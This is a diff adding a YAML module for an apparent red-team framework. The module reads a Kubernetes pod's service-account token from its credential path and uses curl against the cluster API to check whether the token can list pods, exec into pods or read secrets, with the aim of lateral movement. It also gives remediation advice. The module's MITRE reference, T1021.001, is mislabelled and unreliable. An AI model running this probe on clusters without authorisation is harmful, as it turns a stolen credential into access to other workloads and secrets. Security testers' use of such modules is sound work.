@@ -1,0 +1,45 @@
+# K8s SA token → kubectl exec into other pods in the cluster
+technique: T1021.001
+name: K8s service-account token → cross-pod kubectl exec
+key: lateral:k8s-sa-kubectl-exec
+tactic: [lateral-movement, discovery]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: moderate
+detect:
+  facts_match: {has_k8s_token: true}
+execute:
+  command: |-
+    # The pod's SA token is at the well-known path; what it can DO depends
+    # on the ClusterRoleBinding chain. Minimum enumeration: can I list
+    # pods, exec into them, read secrets?
+    tok=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+    api="${KUBERNETES_SERVICE_HOST:-kubernetes.default}:${KUBERNETES_SERVICE_PORT:-443}"
+    ns=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
+    # Three permission probes — pods list, pod exec, secrets list.
+    for verb in 'list pods' 'create pods/exec' 'list secrets'; do
+      v=${verb% *}; r=${verb#* }
+      echo -n "$verb -> "
+      curl -sk -H "Authorization: Bearer $tok"         "https://$api/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"         -X POST -H 'Content-Type: application/json'         -d "{\"spec\":{\"resourceAttributes\":{\"namespace\":\"$ns\",\"verb\":\"$v\",\"resource\":\"$r\"}}}"         | grep -o '"allowed":[a-z]*' | head -1
+    done
+verify:
+  success: "allowed"
+cleanup:
+  command: ""
+report:
+  vector_type: k8s_sa_lateral
+  evidence: "readable /var/run/secrets/kubernetes.io/serviceaccount/token"
+  description: >
+    A pod's service-account token grants whatever its RBAC permits. In
+    most clusters, default-SA tokens have more reach than operators
+    realize — list pods, exec into them (lateral into any pod in the
+    namespace / cluster), read secrets (crown-jewel credentials). This
+    TTP probes the three canonical permissions via SelfSubjectAccessReview
+    so the finding is honest: it tells you exactly what the token can do.
+  remediation: >
+    Scope ClusterRoleBindings to least-privilege. Default SAs shouldn't
+    have cluster-wide reach. Rotate SA tokens on cluster upgrade.
+    Prefer bound-service-account projected volumes with short TTL.
+  refs: [T1021.001]
